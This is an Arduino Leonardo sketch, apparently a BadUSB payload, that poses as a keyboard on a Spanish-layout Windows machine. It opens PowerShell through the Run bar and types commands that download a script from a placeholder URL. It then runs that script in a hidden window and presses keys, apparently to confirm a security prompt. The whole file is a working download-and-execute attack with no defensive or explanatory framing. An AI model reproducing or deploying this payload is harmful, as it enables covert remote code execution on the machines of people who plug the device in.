#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("powershell");
  delay(5000);
  Keyboard.println("$client = new-object System.Net.WebClient");
  delay(2000);
  Keyboard.println("$client.DownloadFile(\"https://scriptURL\" , \"script.ps1\")");
  delay(12000);
  CommandAtRunBarMSWIN("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
  delay(5000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  while(1);
}
